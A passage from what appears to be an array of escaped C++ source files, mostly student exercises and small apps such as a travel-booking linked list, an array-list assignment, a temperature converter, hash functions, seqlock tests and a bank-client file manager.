jumlah pembayaran: \";\r\n            cin >> newNode->jumlah;\r\n            clearInputBuffer();\r\n            newNode->next = headPembayaran;\r\n            headPembayaran = newNode;\r\n            break;\r\n        }\r\n        default:\r\n            cout << \"Pilihan tidak valid\" << endl;\r\n    }\r\n}\r\n\r\nvoid read(Pelanggan* headPelanggan, Perjalanan* headPerjalanan, Pemesanan* headPemesanan, Pembayaran* headPembayaran) {\r\n    int pilihan;\r\n    cout << \"Read apa?\" << endl;\r\n    cout << \"1. Pelanggan\" << endl;\r\n    cout << \"2. Perjalanan\" << endl;\r\n    cout << \"3. Pemesanan\" << endl;\r\n    cout << \"4. Pembayaran\" << endl;\r\n    cout << \"Masukkan pilihan: \";\r\n    cin >> pilihan;\r\n    clearInputBuffer();\r\n\r\n    switch (pilihan) {\r\n        case 1: {\r\n            Pelanggan* temp = headPelanggan;\r\n            while (temp != NULL) {\r\n                cout << \"Nama Pelanggan: \" << temp->nama << endl;\r\n                cout << \"Email Pelanggan: \" << temp->email << endl;\r\n                cout << \"Nomor Telepon Pelanggan: \" << temp->nomorTelepon << endl;\r\n                cout << \"Alamat Pelanggan: \" << temp->alamat << endl;\r\n                temp = temp->next;\r\n            }\r\n            break;\r\n        }\r\n        case 2: {\r\n            Perjalanan* temp = headPerjalanan;\r\n            while (temp != NULL) {\r\n                cout << \"Nama Perjalanan: \" << temp->namaPerjalanan << endl;\r\n                cout << \"Tujuan Perjalanan: \" << temp->tujuan << endl;\r\n                cout << \"Tanggal Perjalanan: \" << temp->tanggal << endl;\r\n                cout << \"Harga Perjalanan: \" << temp->harga << e",
    "/*1.1 \u987a\u5e8f\u8868\r\n\r\n    bool Insert(const int p, const T value);        //1.1-b\r\n    \u5728\u4f4d\u7f6ep\u63d2\u5165\u5143\u7d20value,\u8868\u7684\u957f\u5ea6\u589e\u52a01 bool Delete(const int p); //1.1-d\r\n    \u5220\u9664\u4f4d\u7f6ep\u5904\u7684\u5143\u7d20\uff0c\u8868\u7684\u957f\u5ea6\u51cf1 int GetPos(const T x);\r\n    //1.1-c \u8fd4\u56de\u503c\u4e3ax\u7684\u5143\u7d20\u7684\u4f4d\u7f6e\r\n\r\n*/\r\n#include <iostream>\r\nusing namespace std;\r\n\r\n// #pragma once\r\ntemplate <class T>\r\nclass List {\r\n   public:\r\n    void Clear();                // \u7f6e\u7a7a\u7ebf\u6027\u8868\r\n    bool IsEmpty();              // \u7ebf\u6027\u8868\u4e3a\u7a7a\u65f6\uff0c\u8fd4\u56detrue\r\n    bool Append(const T value);  // \u5728\u8868\u5c3e\u6dfb\u52a0\u5143\u7d20value\uff0c\u8868\u7684\u957f\u5ea6\u589e\u52a01\r\n    bool Insert(const int p,\r\n                const T value);  // \u5728\u4f4d\u7f6ep\u63d2\u5165\u5143\u7d20value,\u8868\u7684\u957f\u5ea6\u589e\u52a01\r\n    bool Delete(const int p);  // \u5220\u9664\u4f4d\u7f6ep\u5904\u7684\u5143\u7d20\uff0c\u8868\u7684\u957f\u5ea6\u51cf1\r\n    int GetPos(const T x);  // \u628a\u503c\u4e3ax\u7684\u5143\u7d20\u7684\u4f4d\u7f6e\u8fd4\u56de\u5230\u53d8\u91cfp\u4e2d\r\n};\r\n\r\ntemplate <class T>                // \u7ebf\u6027\u8868\u7684\u5143\u7d20\u7c7b\u578b\u4e3aT\r\nclass ArrayList : public List<T>  // \u5b9a\u4e49\u987a\u5e8f\u8868ArrayList\r\n{\r\n   public:                     // \u987a\u5e8f\u8868\u7684\u8fd0\u7b97\u96c6\r\n    ArrayList(const int size)  // \u521b\u5efa\u987a\u5e8f\u8868\uff0c\u8868\u957f\u4e3a\u6700\u5927\u957f\u5ea6\r\n    {\r\n        maxSize = size;\r\n        arrayList = new T[maxSize];\r\n        curLen = 0;\r\n        position = 0;\r\n    }\r\n    ~ArrayList()  // \u6790\u6784\u51fd\u6570\uff0c\u6d88\u9664ArrayList\u7684\u5b9e\u4f8b\r\n    {\r\n        delete[] arrayList;\r\n    }\r\n    void clear()  // \u6e05\u7a7a\u987a\u5e8f\u8868\r\n    {\r\n        delete[] arrayList;\r\n        curLen = 0;\r\n        position = 0;\r\n        arrayList = new T[maxSize];\r\n    }\r\n\r\n    int Length();                // \u987a\u5e8f\u8868\u7684\u957f\u5ea6\r\n    bool Append(const T value);  // \u5728\u8868\u5c3e\u6dfb\u52a0\u5143\u7d20value\uff0c\u8868\u7684\u957f\u5ea6\u589e\u52a01\r\n\r\n    bool Insert(const int p,\r\n                const T value);  // 1.1-b \u5728\u4f4d\u7f6ep\u63d2\u5165\u5143\u7d20value,\u8868\u7684\u957f\u5ea6\u589e\u52a01\r\n    bool Delete(const int p);  // 1.1-d \u5220\u9664\u4f4d\u7f6ep\u5904\u7684\u5143\u7d20\uff0c\u8868\u7684\u957f\u5ea6\u51cf1\r\n    int GetPos(const T x);  // 1.1-c \u8fd4\u56de\u503c\u4e3ax\u7684\u5143\u7d20\u7684\u4f4d\u7f6e\r\n    void PrintArray();      // \u8f93\u51fa\u987a\u5e8f\u8868\u5185\u5bb9\r\n   private:\r\n    T* arrayList;  // \u5b58\u50a8\u987a\u5e8f\u8868\u7684\u5b9e\u4f8b\r\n    int maxSize;   // \u987a\u5e8f\u8868\u5b9e\u4f8b\u7684\u6700\u5927\u957f\u5ea6\r\n    int curLen;    // \u987a\u5e8f\u8868\u5b9e\u4f8b\u7684\u5f53\u524d\u957f\u5ea6\r\n    int position;  // \u5f53\u524d\u5904\u7406\u4f4d\u7f6e\r\n};\r\n\r\ntemplate <class T>\r\nint ArrayList<T>::Length() {\r\n    return curLen;\r\n}\r\n\r\n// \u5728\u8868\u5c3e\u6dfb\u52a0\u5143\u7d20value\uff0c\u8868\u7684\u957f\u5ea6\u589e\u52a01\r\ntemplate <class T>\r\nbool ArrayList<T>::Append(const T value) {\r\n    if (curLen >= maxSize)  // \u68c0\u67e5\u987a\u5e8f\u8868\u662f\u5426\u6ea2\u51fa\r\n    {\r\n        cout << \"The List is overflow\" << endl;\r\n        return false;\r\n    }\r\n    arrayList[curLen] = value;  // \u8868\u5c3e\u5904\u63d2\u5165\u65b0\u5143\u7d20\r\n    curLen++;                   // \u8868\u7684\u5b9e\u9645\u957f\u5ea6\u589e\u52a01\r\n    return true;\r\n}\r\n\r\n/*\r\nTODO:1.1-b\r\n\u5728\u4f4d\u7f6ep\u63d2\u5165\u5143\u7d20value,\u8868\u7684\u957f\u5ea6\u589e\u52a01\uff0cp\u4e3a\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u4e0b\u6807\u503c\u3002\u6bd4\u5982\uff1ap=0\uff0c\u8868\u793a\u5728\u987a\u5e8f\u8868\u7684\u8868\u5934\u63d2\u5165\u5143\u7d20\u3002\r\n\u8fd4\u56de\u503c\u8bf4\u660e\uff1a\u63d2\u5165\u6210\u529f\uff0c\u8fd4\u56detrue\uff0c\u5426\u5219\u8fd4\u56defalse\r\n\u6ce8\u610f\u4e8b\u9879\uff1a1\uff09\u68c0\u67e5\u987a\u5e8f\u8868\u662f\u5426\u6ea2\u51fa\uff0c\u82e5\u6ea2\u51fa,\u5219\u6253\u5370cout << \"The List is overflow\" <<\r\nendl;\u8fd4\u56defalse 2\uff09\u68c0\u67e5\u63d2\u5165\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\uff0c\u82e5\u4e0d\u5408\u6cd5\uff0c\u5219cout << \"Insertion point is\r\nillegal\" << endl; \u8fd4\u56defalse\r\n*/\r\ntemplate <class T>\r\nbool ArrayList<T>::Insert(const int p, const T value) {\r\n    if (curLen >= maxSize) {\r\n        cout << \"The List is overflow\" << endl;\r\n        return false;\r\n    }\r\n    if (p < 0 || p > curLen - 1) {\r\n        cout << \"Insertion point is illegal\" << endl;\r\n        return false;\r\n    }\r\n    for (int i = curLen; i > p; i--) {\r\n        arrayList[i] = arrayList[i - 1];\r\n    }\r\n    arrayList[p] = value;\r\n    curLen++;\r\n    return true;\r\n}\r\n\r\n/*\r\nTODO:1.1-d \u5220\u9664\u4f4d\u7f6ep\u5904\u7684\u5143\u7d20\uff0c\u8868\u7684\u957f\u5ea6\u51cf1\uff0cp\u4e3a\u5143\u7d20\u6240\u5728\u7684\u4e0b\u6807\u503c\r\n\u8fd4\u56de\u503c\u8bf4\u660e\uff1a\u5220\u9664\u6210\u529f\uff0c\u8fd4\u56detrue\uff0c\u5426\u5219\u8fd4\u56defalse\r\n\u6ce8\u610f\u4e8b\u9879\uff1a1\uff09\u5982\u679c\u987a\u5e8f\u8868\u4e2d\u6ca1\u6709\u5143\u7d20\u4e86\uff0c\u5219\u6253\u5370cout << \"No element to delete\" <<\r\nendl;\u5e76\u8fd4\u56defalse 2\uff09\u5982\u679c\u5220\u9664\u7684\u4f4d\u7f6ep\u975e\u6cd5\uff0c\u5373p\u4f4d\u7f6e\u5904\u65e0\u5143\u7d20\uff0c\u5219\u6253\u5370cout <<\r\n\"Deletion is illegal\" << endl;\u5e76\u8fd4\u56defalse\r\n*/\r\ntemplate <class T>\r\nbool ArrayList<T>::Delete(const int p) {\r\n    if (curLen == 0) {\r\n        cout << \"No element to delete\" << endl;\r\n        return false;\r\n    }\r\n    if (p > curLen - 1 || p < 0) {\r\n        cout << \"Deletion is illegal\" << endl;\r\n        return false;\r\n    }\r\n    for (int i = p; i <= curLen - 1; i++) {\r\n        arrayList[i] = arrayList[i + 1];\r\n    }\r\n    curLen--;\r\n    return true;\r\n}\r\n\r\n/*\r\nTODO:1.1-c \u8fd4\u56de\u503c\u987a\u5e8f\u8868\u4e2d\u7b2c\u4e00\u4e2a\u503c\u4e3ax\u7684\u7ed3\u70b9\u4f4d\u7f6e\u4e0b\u6807\r\n\u8fd4\u56de\u503c\u8bf4\u660e\uff1a\u5982\u679c\u5728\u987a\u5e8f\u8868\u4e2d\u4ece\u5934\u5230\u5c3e\u627e\u5230x\u5143\u7d20\uff0c\u5219\u7acb\u523b\u8fd4\u56dex\u5143\u7d20\u6240\u5728\u7684\u4f4d\u7f6e\u4e0b\u6807\u3002\u5373\uff1a\u5047\u5982x\u5728\u987a\u5e8f\u8868\u4e2d\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u5219\u8fd4\u56de0\uff0c\u4ee5\u6b64\u7c7b\u63a8\r\n            \u5982\u679c\u627e\u4e0d\u5230x\u5143\u7d20\uff0c\u5219\u8fd4\u56de-1\r\n*/\r\ntemplate <class T>\r\nint ArrayList<T>::GetPos(const T x) {\r\n    for (int i = 0; i <= curLen - 1; i++) {\r\n        if (arrayList[i] == x)\r\n            return i;\r\n    }\r\n    return -1;\r\n}\r\n\r\n// \u8f93\u51fa\u987a\u5e8f\u8868\u5185\u5bb9\r\ntemplate <class T>\r\nvoid ArrayList<T>::PrintArray() {\r\n    for (int i = 0; i < curLen; i++) {\r\n        cout << arrayList[i] << \" \";\r\n    }\r\n    cout << endl;\r\n}\r\nint main() {\r\n    int maxsize, pos0, pos1, value0, value1;\r\n    cin >> maxsize >> pos0 >> pos1 >> value0 >> value1;\r\n    ArrayList<int> arr(maxsize);\r\n    int p;\r\n    for (int i = 0; i < 5; i++) {\r\n        arr.Append(i);\r\n    }\r\n    arr.PrintArray();\r\n    arr.Insert(pos0, value0);  // \u4f4d\u7f6epos0\u5904\u63d2\u5165value0\r\n    arr.PrintArray();\r\n    arr.Delete(pos1);  // \u5220\u9664\u4f4d\u7f6epos1\u5904\u7684\u5143\u7d20\r\n    arr.PrintArray();\r\n    p = arr.GetPos(value1);  // \u83b7\u5f97\u503c\u4e3avalue1\u7684\u7ed3\u70b9\u4f4d\u7f6e\r\n    cout << p << endl;\r\n    return 0;\r\n}",
    "#include <iostream>\r\n#include<iomanip>\r\nusing namespace std;\r\n\r\nint main (){\r\n//suhu konverter\r\n    char ConvertSuhu,repeat;\r\n    float celcius, fahrenheit, kelvin, reamur;\r\n\r\ndo\r\n{\r\n\r\n    cout << \"Convert Suhu (c/f/k/r): \";\r\n    cin >> ConvertSuhu;\r\n\r\nswitch (ConvertSuhu)\r\n{\r\ncase 'c':\r\n    cout << \"celcius = \"; cin >> celcius;\r\n    fahrenheit = (celcius*9/5)+32;\r\n    kelvin = celcius + 273;\r\n    reamur = celcius*4/5;\r\n    cout << \"reamur\"<< setw(8) << \"=\"<<setw(10) << reamur <<endl;\r\n    cout << \"fahrenheit\" << setw(4) << \"=\" <<setw(10) << fahrenheit << endl;\r\n    cout << \"kelvin\"<< setw(8) << \"=\"<<setw(10) << kelvin <<endl;\r\n    break;\r\ncase 'f':\r\n    cout << \"fahrenheit = \"; cin >> fahrenheit;\r\n    celcius = (fahrenheit-32)*5/9;\r\n    kelvin = celcius + 273;\r\n    reamur = celcius *4 / 5;\r\n    cout << \"reamur\" << setw(8) <<\"=\"<<setw(10)<< reamur <<endl; \r\n    cout << \"celcius\"<< setw(7) <<\"=\"<<setw(10) <<celcius <<endl; \r\n    cout << \"kelvin\" << setw(8) <<\"=\"<<setw(10)<<kelvin<<endl;\r\n    break;\r\ncase 'k':\r\n   cout << \"kelvin = \"; cin >> kelvin;\r\n    celcius = kelvin-273;\r\n    fahrenheit = (celcius*9/5)+32;\r\n    reamur = celcius*4/5;\r\n    cout << \"reamur\"<< setw(8) <<\"=\"<<setw(10)<< reamur <<endl;\r\n    cout << \"celcius\"<< setw(7) <<\"=\"<<setw(10) << celcius <<endl; \r\n    cout << \"fahrenheit\" << setw(4) <<\"=\"<<setw(10) << fahrenheit<<endl;\r\n    break;\r\ncase 'r':\r\n    cout << \"reamur = \"; cin >> reamur;\r\n    celcius = reamur*5/4;\r\n    kelvin = celcius + 273;\r\n    fahrenheit = (celcius*9/5)+32;\r\n    cout << \"fahrenheit\" << setw(4) <<\"=\"<<setw(10) << fahrenheit <<endl;\r\n    cout << \"celcius\" << setw(7) <<\"=\"<<setw(10)<< celcius<<endl; \r\n    cout << \"kelvin\"<< setw(8) <<\"=\"<<setw(10) << kelvin <<endl;\r\n    break;\r\n    }\r\ncout << \"Convert again?(y/n) : \";\r\ncin >> repeat;   \r\n} while (repeat == 'y');\r\n}",
    "/*\n  Copyright (c) 2024\n  Swarthmore College Computer Science Department, Swarthmore PA\n  J. Brody, A. Danner, L. Fontes, L. Meeden, Z. Palmer, A. Soni\n  Distributed as course material for Spring 2024\n  CPSC 035: Data Structures and Algorithms\n  https://tinyurl.com/25wjykh8\n*/\n\n#include \"hashFunctions.h\"\n#include <string>\n\nusing std::string;\n\nint hash(int data, int range) {\n    // data is already an int, but could be out of range\n    // use mod to put back into range\n    int toReturn = data % range;\n    if (toReturn < 0) {\n        // NOTE: C++ % can return negative numbers if the value beeing\n        // modded is negative.  To fix: add range to get positive.\n        toReturn += range;\n    }\n    return toReturn;\n}\n\nint hash(string data, int range) {\n    int hash_value = 0;\n    for (int i = 0; i < data.length(); i++) {\n        hash_value *= 31;       // prime number helps to avoid hash collisions\n        hash_value += data[i]; // remember: characters can be treated as ints\n    }\n\n    // now, compress down to range\n    int toReturn = hash_value % range;\n    if (toReturn < 0) {\n        toReturn += range;\n    }\n    return toReturn;\n}\n",
    "#include \"seqlock/seqlock.hpp\"\n\n#include <gtest/gtest.h>\n\n#include <algorithm>\n#include <cstring>\n#include <iostream>\n#include <mutex>\n#include <thread>\n#include <vector>\n\n#include \"seqlock/spinlock.hpp\"\n\nusing seqlock::SeqLock;\nusing seqlock::SpinLock;\nusing seqlock::mode::Mode;\nusing seqlock::mode::MultiWriter;\nusing seqlock::mode::SingleWriter;\n\nconstexpr size_t kBufferSize = 1024;\n\nTEST(SeqLock, CorrectMode) {\n    // basically checking if SFINAE works\n    ASSERT_EQ(sizeof(SeqLock<SingleWriter>), 8);\n    ASSERT_GT(sizeof(SeqLock<MultiWriter>), sizeof(SeqLock<SingleWriter>));\n}\n\nTEST(SeqLock, SingleThread) {\n    SeqLock<SingleWriter> lock{};\n    char buf[kBufferSize];\n    memset(buf, 0, kBufferSize);\n\n    ASSERT_EQ(lock.Sequence(), 0);\n    lock.Store([&] { memset(buf, 1, kBufferSize); });\n    ASSERT_EQ(lock.Sequence(), 2);\n\n    lock.TryLoad([&] {\n        for (size_t i = 0; i < kBufferSize; i++) {\n            ASSERT_EQ(buf[i], 1);\n        }\n    });\n    ASSERT_EQ(lock.Sequence(), 2);\n}\n\n// Synchronizes calls to std::cout between Readers and Writers, since std::cout is not thread-safe by default.\nstatic inline std::mutex cout_mutex{};\n\ntemplate <Mode ModeT>\nclass Reader {\n   public:\n    Reader() = delete;\n    explicit Reader(const SeqLock<ModeT>& lock, char* buf, size_t id) : lock_{lock}, buf_{buf}, id_{id} {}\n    ~Reader() = default;\n\n    Reader(const Reader&) = delete;\n    Reader& operator=(const Reader&) = delete;\n\n    Reader(Reader&&) noexcept = default;\n    Reader& operator=(Reader&&) = delete;\n\n    void Run() {\n        cout_mutex.lock();\n        std::cout << \"reader \" << id_ << \" starting\" << std::endl;\n        cout_mutex.unlock();\n\n        int successful = 0;\n        int failed = 0;\n        while (successful < 100) {\n            bool success = lock_.TryLoad([&] { memcpy(last_, buf_, kBufferSize); });\n            if (success) {\n                for (size_t i = 0; i < kBufferSize - 1; i++) {\n                    ASSERT_EQ(last_[i], last_[i + 1]);\n                }\n                successful++;\n            } else {\n                failed++;\n            }\n        }\n\n        cout_mutex.lock();\n        std::cout << \"reader \" << id_ << \" done successful=\" << successful << \" failed=\" << failed << std::endl;\n        cout_mutex.unlock();\n    }\n\n   private:\n    const SeqLock<ModeT>& lock_;\n    char* buf_;\n    size_t id_;\n\n    char last_[kBufferSize];\n};\n\ntemplate <Mode ModeT>\nclass Writer {\n   public:\n    Writer() = delete;\n    explicit Writer(SeqLock<ModeT>& lock, char* buf, size_t id = 0) : lock_{lock}, buf_{buf}, id_{id} {}\n    ~Writer() = default;\n\n    Writer(const Writer&) = delete;\n    Writer& operator=(const Writer&) = delete;\n\n    Writer(Writer&&) noexcept = default;\n    Writer& operator=(Writer&&) = delete;\n\n    void Run()\n        requires std::same_as<ModeT, SingleWriter>\n    {\n        cout_mutex.lock();\n        std::cout << \"writer starting\" << std::endl;\n        cout_mutex.unlock();\n\n        for (int i = 0; i < 1'000'000; i++) {\n            ASSERT_TRUE(lock_.Sequence() % 2 == 0);\n            const auto seq_before = lock_.Sequence();\n\n            lock_.Store([&] {\n                ASSERT_TRUE(lock_.Sequence() % 2 != 0);\n                memcpy(last_, buf_, kBufferSize);\n                memset(buf_, (last_[0] + 1) & 255, kBufferSize);\n            });\n            ASSERT_EQ(lock_.Sequence(), seq_before + 2);\n        }\n\n        cout_mutex.lock();\n        std::cout << \"writer done\" << std::endl;\n        cout_mutex.unlock();\n    }\n\n    void Run()\n        requires std::same_as<ModeT, MultiWriter>\n    {\n        cout_mutex.lock();\n        std::cout << \"writer \" << id_ << \" starting\" << std::endl;\n        cout_mutex.unlock();\n\n        for (int i = 0; i < 1'000'000; i++) {\n            lock_.Store([&] {\n                ASSERT_TRUE(lock_.Sequence() % 2 != 0);\n                memcpy(last_, buf_, kBufferSize);\n                memset(buf_, (last_[0] + 1) & 255, kBufferSize);\n            });\n        }\n\n        cout_mutex.lock();\n        std::cout << \"writer \" << id_ << \" done\" << std::endl;\n        cout_mutex.unlock();\n    }\n\n   private:\n    SeqLock<ModeT>& lock_;\n    char* buf_;\n    size_t id_;\n\n    char last_[kBufferSize];\n};\n\nTEST(SeqLock, MultiThreadSingleWriterSingleReader) {\n    SeqLock<SingleWriter> lock{};\n\n    char buf[kBufferSize];\n    memset(buf, 0, kBufferSize);\n\n    Reader<SingleWriter> r{lock, buf, 0};\n    std::thread rt{&Reader<SingleWriter>::Run, &r};\n\n    Writer<SingleWriter> w{lock, buf};\n    std::thread wt{&Writer<SingleWriter>::Run, &w};\n\n    rt.join();\n    wt.join();\n}\n\nTEST(SeqLock, MultiThreadSingleWriterMultiReader) {\n    SeqLock<SingleWriter> lock{};\n\n    char buf[kBufferSize];\n    memset(buf, 0, kBufferSize);\n\n    std::vector<Reader<SingleWriter>> readers;\n    std::vector<std::thread> reader_threads;\n    constexpr size_t kReaders = 10;\n    readers.reserve(kReaders);\n    reader_threads.reserve(kReaders);\n    std::cout << \"will spawn \" << kReaders << \" readers\" << std::endl;\n    for (size_t i = 0; ",
    "#include \"dietplangenerator.h\"\n#include <cstdlib>\n\n\nDietPlanGenerator::DietPlanGenerator(const FoodCategories &foodCategories)\n    : foodCategories(foodCategories) {}\n\n\nQJsonArray DietPlanGenerator::generateDietPlan() const {\n    QJsonArray dietPlan;\n\n    // Get the list of all food categories\n    QStringList categories = foodCategories.categories.keys();\n\n    // Generate diet plan for each day of the week\n    for (int day = 0; day < 7; ++day) {\n        QJsonObject dayPlan;\n        QJsonArray meals;\n\n        // Generate meals for each day\n        for (int meal = 0; meal < 4; ++meal) {\n            QStringList mealItems;\n\n            // Select random items from each category\n            for (const QString &category : categories) {\n                const QList<QString> &items = foodCategories.categories[category];\n                mealItems.append(items.at(std::rand() % items.size()));\n            }\n\n            // Add meal to the meals array\n            meals.append(QString(\"Meal %1: %2\").arg(meal + 1).arg(mealItems.join(\", \")));\n        }\n\n        // Add meals to the day's plan\n        dayPlan[\"meals\"] = meals;\n\n        // Add the day's plan to the diet plan array\n        dietPlan.append(dayPlan);\n    }\n\n    return dietPlan;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\r\n#include <Windows.h>\r\n#include <conio.h>\r\n#include <thread> \r\n#include <chrono>\r\n#include <string>\r\n\r\nusing namespace std::chrono_literals;\r\nusing namespace std;\r\n\r\nHANDLE console;\r\n\r\n\r\nvoid Draw() {\r\n    COORD pos;\r\n    pos.X = 70;\r\n    pos.Y = 10;\r\n\r\n    SetConsoleTextAttribute(console, BACKGROUND_BLUE);\r\n\r\n    for (int i = 0; i < 30; ++i) {\r\n        SetConsoleCursorPosition(console, pos);\r\n        std::cout << \" \";\r\n        pos.X++;\r\n    }\r\n}\r\n\r\n\r\nvoid Write() {\r\n    COORD pos;\r\n    pos.X = 70;\r\n    pos.Y = 10;\r\n    SetConsoleCursorPosition(console, pos);\r\n    int input = 0;\r\n    while (input != 27)\r\n    {\r\n        if (_kbhit())\r\n        {\r\n            input = _getch();\r\n            if ((input == 224 || input == 0) && _kbhit() == 1) {\r\n                switch (_getch()) {\r\n                case 75:\r\n                    if (pos.X > 70) {\r\n                        pos.X--;\r\n                    }\r\n                    SetConsoleCursorPosition(console, pos);\r\n                    break;\r\n                case 77:\r\n                    if (pos.X < 99) {\r\n                        pos.X++;\r\n                    }\r\n                    SetConsoleCursorPosition(console, pos);\r\n                    break;\r\n                }\r\n            }\r\n            else {\r\n                if ((pos.X >= 70 && pos.X <= 99) && (32 <= input && input <= 255)) {\r\n                    cout << char(input);\r\n                    pos.X++;\r\n                    SetConsoleCursorPosition(console, pos);\r\n                }\r\n                if ((pos.X > 70 && pos.X <= 100) && input == 8) {\r\n                    pos.X--;\r\n                    SetConsoleCursorPosition(console, pos);\r\n                    cout << \" \";\r\n                    SetConsoleCursorPosition(console, pos);\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    console = GetStdHandle(STD_OUTPUT_HANDLE);\r\n    Draw();\r\n    Write();\r\n}\r\n",
    "#include <iostream>\n#include <cmath>\n#include <utility>\n\nusing namespace std;\n\n\nbool is_perfect_square(int x) {\n    int root = static_cast<int>(sqrt(x));\n    return root * root == x;\n}\n\n\npair<int, int> closest_pair_tonum(int upper_limit) {\n    pair<int, int> best_pair = {-1, -1};\n\n    \n    for (int m = upper_limit - 1; m > 0; --m) {\n        \n        for (int n = m - 1; n > 0; --n) {\n            int sum_mn = m + n;\n            int diff_mn = m - n;\n\n            \n            if (is_perfect_square(sum_mn) && is_perfect_square(diff_mn)) {\n                pair<int, int> current_pair = {m, n};\n\n                \n                if (current_pair > best_pair) {\n                    best_pair = current_pair;\n                }\n            }\n        }\n    }\n\n    return best_pair;\n}\n\nint main() {\n\n    int lim;\n    std::cout << \"limit: \";\n    std::cin >> lim;\n    cout << \"closest_pair_tonum(\" << lim << \"):\";\n    pair<int, int> result1 = closest_pair_tonum(lim);\n    cout << \"(\" << result1.first << \", \" << result1.second << \")\" << endl;\n\n    return 0;\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <string>\n#include <cctype>\n#include <fstream>\n\nusing namespace std;\n\nconst string\tCLIENTS_FILENAME = \"Clients.txt\";\n\nstruct\ts_client\n{\n\tstring\tstr_id_nbr;\n\tstring\tstr_pin_nbr;\n\tstring\tstr_name;\n\tstring\tstr_phone_nbr;\n\tdouble\td_account_balance;\n\tbool\trequest_for_delete = false;\n};\n\nvector <string>\tft_get_str_client_data_fields(string str_formatted_file_line, string str_fields_separator = \"#//#\")\n{\n\tvector <string>\tv_str_client_data_fields;\n\tunsigned short\tfields_separator_len;\n\tshort\tindex;\n\n\tfields_separator_len = str_fields_separator.length();\n\twhile ((index = str_formatted_file_line.find(str_fields_separator)) != string::npos)\n\t{\n\t\tv_str_client_data_fields.emplace_back(str_formatted_file_line.substr(0, index));\n\t\tstr_formatted_file_line.erase(0, index + fields_separator_len);\n\t}\n\tif (str_formatted_file_line != \"\")\n\t\tv_str_client_data_fields.emplace_back(str_formatted_file_line);\n\treturn (v_str_client_data_fields);\n}\n\ns_client\tft_get_client_data_from_line(string str_formatted_file_line, string str_fields_separator = \"#//#\")\n{\n\ts_client client_s;\n\tvector <string>\tv_str_client_data_fields;\n\n\tv_str_client_data_fields = ft_get_str_client_data_fields(str_formatted_file_line);\n\tclient_s.str_id_nbr = v_str_client_data_fields[0];\n\tclient_s.str_pin_nbr = v_str_client_data_fields[1];\n\tclient_s.str_name = v_str_client_data_fields[2];\n\tclient_s.str_phone_nbr = v_str_client_data_fields[3];\n\tclient_s.d_account_balance = stod(v_str_client_data_fields[4]);\n\treturn (client_s);\n}\n\nvector <s_client>\tft_v_get_clients_from_file(string str_filename = CLIENTS_FILENAME)\n{\n\tfstream\tfile_of_clients;\n\tvector <s_client>\tv_clients_s;\n\tstring\tstr_formatted_file_line;\n\n\tfile_of_clients.open(str_filename, ios::in);\n\tif (file_of_clients.is_open())\n\t{\n\t\twhile(getline(file_of_clients, str_formatted_file_line))\n\t\t{\n\t\t\tv_clients_s.emplace_back(ft_get_client_data_from_line(str_formatted_file_line));\n\t\t}\n\t\tfile_of_clients.close();\n\t}\n\treturn (v_clients_s);\n}\n\nbool\tft_search_if_client_exist (string str_acc_nbr, s_client &client_s, string str_filename = CLIENTS_FILENAME)\n{\n\tvector <s_client>   v_clients_s;\n\n\tv_clients_s = ft_v_get_clients_from_file(str_filename);\n\tfor (s_client &client_s2 : v_clients_s)\n\t{\n\t\tif (client_s2.str_id_nbr == str_acc_nbr)\n\t\t{\n\t\t\tclient_s = client_s2;\n\t\t\treturn (true);\n\t\t}\n\t}\n\treturn (false);\n}\n\nvoid\tft_print_client_data_details(s_client client)\n{\n\tprintf(\"\\nThe following are the client details\\n\\n\");\n\tprintf(\"%-30s: %s\\n\", \"Account ID Number\", client.str_id_nbr.c_str());\n\tprintf(\"%-30s: %s\\n\", \"Account PIN Number\", client.str_pin_nbr.c_str());\n\tprintf(\"%-30s: %s\\n\", \"Client Name\", client.str_name.c_str());\n\tprintf(\"%-30s: %s\\n\", \"Client Phone Number\", client.str_phone_nbr.c_str());\n\tprintf(\"%-30s: %.2f\\n\", \"Client Account Balance\", client.d_account_balance);\n}\n\ns_client\tft_get_client_info_updation(string str_acc_nbr)\n{\n\ts_client    client_s;\n\n\tclient_s.str_id_nbr = str_acc_nbr;\n\tprintf(\"\\n\\nPlease enter the updation of the client:\\n\");\n\tprintf(\"PIN Number: \");\n\tgetline(cin >> ws, client_s.str_pin_nbr);\n\tprintf(\"Client Name: \");\n\tgetline(cin >> ws, client_s.str_name);\n\tprintf(\"Phone Number: \");\n\tgetline(cin >> ws, client_s.str_phone_nbr);\n\tprintf(\"Account Balance: \");\n\tcin >> client_s.d_account_balance;\n\treturn (client_s);\n}\n\nstring\tft_get_formatted_line_from_client_data(s_client client_s, string str_fields_separator = \"#//#\")\n{\n\tstring\tstr_formatted_client_data_line;\n\n\tstr_formatted_client_data_line = \"\";\n\tstr_formatted_client_data_line += client_s.str_id_nbr + str_fields_separator;\n\tstr_formatted_client_data_line += client_s.str_pin_nbr + str_fields_separator;\n\tstr_formatted_client_data_line += client_s.str_name + str_fields_separator;\n\tstr_formatted_client_data_line += client_s.str_phone_nbr + 